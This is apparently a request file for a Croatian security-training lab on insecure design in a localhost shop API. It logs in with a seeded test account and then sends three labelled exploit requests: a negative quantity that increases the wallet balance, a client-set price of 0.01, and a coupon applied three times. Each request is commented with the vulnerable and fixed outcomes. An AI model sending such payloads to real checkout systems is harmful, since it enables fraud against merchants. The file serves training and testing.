### Lab10 – Insecure Design (poslovna logika)
@host = http://localhost:8000
@token = PASTE_TOKEN

### 1. Prijava (kopiraj token u @token)
POST {{host}}/api/auth/login
Content-Type: application/json

{"username": "ana", "password": "Ana123!"}

### 2. Stanje novcanika (seed 1000.00 EUR)
GET {{host}}/api/lab10/wallet
Authorization: Bearer {{token}}

### 3. EKSPLOATACIJA: negativna kolicina POVECAVA stanje
# Ranjivo (main): stanje poraste. Popravljeno: 400.
POST {{host}}/api/lab10/checkout
Authorization: Bearer {{token}}
Content-Type: application/json

{"items": [{"productId": 1, "quantity": -5, "unitPrice": 899.00}], "couponCodes": []}

### 4. EKSPLOATACIJA: lazna cijena 0.01 za laptop
# Ranjivo (main): naplaceno 0.01. Popravljeno: cijena iz baze (899.00) ili 400.
POST {{host}}/api/lab10/checkout
Authorization: Bearer {{token}}
Content-Type: application/json

{"items": [{"productId": 1, "quantity": 1, "unitPrice": 0.01}], "couponCodes": []}

### 5. EKSPLOATACIJA: isti kupon vise puta
# Ranjivo (main): popust se slaze. Popravljeno: 400 ili jednom.
POST {{host}}/api/lab10/checkout
Authorization: Bearer {{token}}
Content-Type: application/json

{"items": [{"productId": 2, "quantity": 1, "unitPrice": 99.00}], "couponCodes": ["AKADEMIJA10","AKADEMIJA10","AKADEMIJA10"]}

### 6. Legitiman checkout (1x Kabel)
POST {{host}}/api/lab10/checkout
Authorization: Bearer {{token}}
Content-Type: application/json

{"items": [{"productId": 3, "quantity": 1, "unitPrice": 9.99}], "couponCodes": []}
